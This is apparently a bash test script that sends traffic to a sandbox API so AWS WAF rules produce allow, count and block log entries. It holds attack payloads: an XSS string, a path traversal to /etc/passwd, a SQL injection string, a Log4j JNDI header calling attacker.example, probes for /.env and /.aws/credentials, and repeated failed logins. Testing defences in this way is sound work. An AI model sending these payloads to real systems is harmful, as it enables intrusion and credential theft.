#!/usr/bin/env bash
# 試験用の WAF (config の waf.enabled: true) の API に curl で通信を送り、WAF のログ (aws-waf-logs-<prefix>) に
# ALLOW / COUNT / BLOCK の行を作る。送るのは sandbox の API (mock 統合で固定の 200) だけ。送信元はこのホストの IP 1 つ。
#
#   SANDBOX_ACCOUNT=123456789012 ./06-waf-traffic.sh [正規 (既定 60)] [探索 (既定 20)] [攻撃らしいクエリ (既定 20)] [/login の連打 (既定 150)] [Challenge / CAPTCHA 宛 (既定 20)]
#
# 任意: LOGIN_INTERVAL  /login の連打の間隔 (秒、既定 0.4)。WAF のレート制限は検出まで数十秒かかるので、1 分ほどかけて送る
#
# Challenge / CAPTCHA 宛は config の waf.challenge / waf.captcha を true で deploy したときに Challenge (GET /search) と CAPTCHA (/api/contact) を受ける。
# curl はトークンを得られない (解かない) ので、ログには「出した」行だけが出る。無効なら ALLOW になるだけ。
# 何が BLOCK / COUNT / ALLOW / CHALLENGE / CAPTCHA になるはずかは scenarios/README.md。
# 書き込む: なし (AWS の API は sts:GetCallerIdentity と cloudformation:DescribeStacks を読むだけ。HTTP の通信で WAF のログが増える)
source "$(dirname "$0")/lib.sh"
require_sandbox_account

NORMAL="${1:-60}"
PROBES="${2:-20}"
ATTACKS="${3:-20}"
LOGINS="${4:-150}"
CHALLENGES="${5:-20}"
LOGIN_INTERVAL="${LOGIN_INTERVAL:-0.4}"
for n in "$NORMAL" "$PROBES" "$ATTACKS" "$LOGINS" "$CHALLENGES"; do
  [[ "$n" =~ ^[0-9]+$ ]] || { echo "件数は 0 以上の整数で指定してください: $n" >&2; exit 2; }
done

API_URL="$(stack_output ApiUrl)"
if [[ -z "$API_URL" || "$API_URL" == "None" ]]; then
  echo "中止: スタック $SANDBOX_STACK に出力 ApiUrl がありません (config の waf.enabled: true で deploy してください)" >&2
  exit 2
fi
API_URL="${API_URL%/}"

UAS=(
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36 arata-sandbox-scenario'
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15 arata-sandbox-scenario'
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 arata-sandbox-scenario'
)

# 1 件送り、「群 応答コード」を 1 行ずつ記録する (最後に数える。macOS の bash 3.2 でも動くよう連想配列は使わない)。応答の本文は捨てる
results="$(mktemp)"
trap 'rm -f "$results"' EXIT
send() { # group curl の引数...
  local group="$1" code
  shift
  code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$@" || true)"
  echo "$group ${code:-000}" >> "$results"
}

# 1. 正規らしい通信 (いくつかのパスと UA。監視役の /health)
for n in $(seq "$NORMAL"); do
  ua="${UAS[$((n % ${#UAS[@]}))]}"
  case $((n % 6)) in
    0) send normal -A "$ua" "$API_URL/" ;;
    1) send normal -A "$ua" "$API_URL/api/items/$((n * 7))" ;;
    2) send normal -A "$ua" "$API_URL/api/users/$((1000 + n))/orders" ;;
    3) send normal -A "$ua" --get --data-urlencode "q=blue shirt $n" "$API_URL/search" ;;
    4) send normal -A 'arata-sandbox-monitor/1.0' "$API_URL/health" ;;
    5) send normal -A "$ua" -X POST -H 'Content-Type: application/json' -d '{"title":"hello"}' "$API_URL/api/posts" ;;
  esac
done

# 2. 探索パス (API に無いパスは API Gateway が 403 を返すが、WAF では ALLOW。すり抜けの素材)
probe_paths=(/.env /.git/config /wp-login.php /phpmyadmin/ /.aws/credentials /xmlrpc.php)
for n in $(seq "$PROBES"); do
  send probe -A "${UAS[0]}" "$API_URL${probe_paths[$((n % ${#probe_paths[@]}))]}"
done

# 3. 攻撃らしいクエリ・ヘッダー
long_q="$(printf 'a%.0s' $(seq 3000))"
for n in $(seq "$ATTACKS"); do
  case $((n % 6)) in
    0) send xss       -A "${UAS[0]}" --get --data-urlencode 'q=<script>alert(1)</script>' "$API_URL/search" ;;               # CommonRuleSet CrossSiteScripting_QUERYARGUMENTS → BLOCK
    1) send lfi       -A "${UAS[0]}" --get --data-urlencode 'file=../../../../etc/passwd' "$API_URL/api/files" ;;           # CommonRuleSet GenericLFI_QUERYARGUMENTS → BLOCK
    2) send sqli      -A "${UAS[0]}" --get --data-urlencode "q=' OR 1=1 --" "$API_URL/search" ;;                             # SQLi のルールセットは入れていない → ALLOW
    3) send log4j     -A "${UAS[0]}" -H 'X-Api-Version: ${jndi:ldap://attacker.example/a}' "$API_URL/api/items/1" ;;       # KnownBadInputs Log4JRCE_HEADER → COUNT
    4) send no_ua     -H 'User-Agent:' "$API_URL/api/items/2" ;;                                                             # CommonRuleSet NoUserAgent_HEADER → COUNT
    5) send long_q    -A "${UAS[1]}" "$API_URL/search?q=$long_q" ;;                                                          # CommonRuleSet SizeRestrictions_QUERYSTRING → COUNT
  esac
done

# 4. /login の連打 (60 秒に 10 件を超えると login-rate-limit が BLOCK。WAF が数えて止めるまで数十秒の遅れがあるので、最初の数十件は通る)
for _ in $(seq "$LOGINS"); do
  send login -A "${UAS[2]}" -X POST -H 'Content-Type: application/json' -d '{"user":"alice","password":"wrong"}' "$API_URL/login"
  sleep "$LOGIN_INTERVAL"
done

# 5. Challenge / CAPTCHA 宛 (ブラウザらしい Accept で GET。トークンは持たないので、ルールが有効なら Challenge は 202、CAPTCHA は 405)
for n in $(seq "$CHALLENGES"); do
  ua="${UAS[$((n % ${#UAS[@]}))]}"
  if (( n % 2 == 0 )); then
    send challenge -A "$ua" -H 'Accept: text/html' --get --data-urlencode "q=shoes $n" "$API_URL/search"
  else
    send captcha -A "$ua" -H 'Accept: text/html' "$API_URL/api/contact"
  fi
done

echo "送った: $API_URL (正規 $NORMAL、探索 $PROBES、攻撃らしい $ATTACKS、/login $LOGINS、Challenge / CAPTCHA 宛 $CHALLENGES)"
echo "群 応答コード 件数 (403 は WAF の BLOCK か、API に無いパス。429 は API Gateway のスロットリング。202 は Challenge、405 は CAPTCHA)"
sort "$results" | uniq -c | awk '{ printf "  %-8s %s %d\n", $2, $3, $1 }'
